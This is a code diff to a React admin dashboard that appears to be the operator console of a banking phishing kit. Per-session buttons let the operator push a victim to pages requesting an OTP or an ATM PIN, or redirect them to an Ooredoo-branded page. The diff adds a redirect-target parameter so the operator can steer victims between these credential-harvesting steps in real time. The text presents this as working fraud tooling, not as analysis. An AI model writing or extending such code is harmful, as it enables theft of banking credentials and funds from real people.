@@ -197,9 +197,9 @@ export default function AdminDashboard() {
     sessionStorage.removeItem('adminAuth');
   };
 
-  const handleAction = async (sessionId: string, action: string, errorMsg?: string) => {
+  const handleAction = async (sessionId: string, action: string, errorMsg?: string, redirectTarget?: string) => {
     try {
-      await takeActionMutation.mutateAsync({ sessionId, action, errorMessage: errorMsg });
+      await takeActionMutation.mutateAsync({ sessionId, action, errorMessage: errorMsg, redirectTarget });
       setShowRedirectMenu(null);
       refetch();
     } catch (error) {
@@ -351,9 +351,9 @@ export default function AdminDashboard() {
                         {showRedirectMenu === s.id && (
                           <div style={{ position: 'absolute', top: '100%', [language === 'ar' ? 'left' : 'right']: 0, marginTop: '8px', backgroundColor: '#fff', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '8px', zIndex: 50, boxShadow: '0 10px 15px -3px rgba(0, 0, 0, 0.1)', width: '160px' }}>
                             <button onClick={() => handleAction(s.id, 'approve')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>✅ {language === 'ar' ? "موافقة" : "Approve"}</button>
-                            <button onClick={() => handleAction(s.id, 'otp')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>🔑 {language === 'ar' ? "طلب OTP" : "Request OTP"}</button>
-                            <button onClick={() => handleAction(s.id, 'atm')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>💳 {language === 'ar' ? "طلب ATM PIN" : "Request ATM PIN"}</button>
-                            <button onClick={() => handleAction(s.id, 'ooredoo')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>🌐 {language === 'ar' ? "توجيه Ooredoo" : "Redirect Ooredoo"}</button>
+                            <button onClick={() => handleAction(s.id, 'otp', undefined, 'otp')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>🔑 {language === 'ar' ? "طلب OTP" : "Request OTP"}</button>
+                            <button onClick={() => handleAction(s.id, 'atm', undefined, 'atm-pin')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>💳 {language === 'ar' ? "طلب ATM PIN" : "Request ATM PIN"}</button>
+                            <button onClick={() => handleAction(s.id, 'ooredoo', undefined, 'ooredoo')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>🌐 {language === 'ar' ? "توجيه Ooredoo" : "Redirect Ooredoo"}</button>
                             <button onClick={() => handleAction(s.id, 'reject', 'بيانات غير صحيحة')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px', color: '#e11d48' }}>❌ {language === 'ar' ? "رفض" : "Reject"}</button>
                           </div>
                         )}
